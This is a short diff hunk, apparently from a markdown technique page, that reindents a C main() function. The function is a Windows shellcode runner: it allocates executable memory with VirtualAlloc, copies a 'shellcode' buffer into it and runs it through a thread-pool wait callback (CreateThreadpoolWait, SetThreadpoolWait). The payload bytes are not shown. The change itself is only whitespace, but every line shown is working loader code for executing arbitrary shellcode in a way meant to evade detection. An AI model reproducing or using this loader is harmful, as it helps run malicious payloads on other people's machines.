@@ -54,15 +54,15 @@ unsigned char shellcode[] =
 
 int main()
 {
-	HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);
-	LPVOID shellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	RtlMoveMemory(shellcodeAddress, shellcode, sizeof(shellcode));
+    HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);
+    LPVOID shellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    RtlMoveMemory(shellcodeAddress, shellcode, sizeof(shellcode));
 
-	PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)shellcodeAddress, NULL, NULL);
-	SetThreadpoolWait(threadPoolWait, event, NULL);
-	WaitForSingleObject(event, INFINITE);
-	
-	return 0;
+    PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)shellcodeAddress, NULL, NULL);
+    SetThreadpoolWait(threadPoolWait, event, NULL);
+    WaitForSingleObject(event, INFINITE);
+
+    return 0;
 }
 ```
 
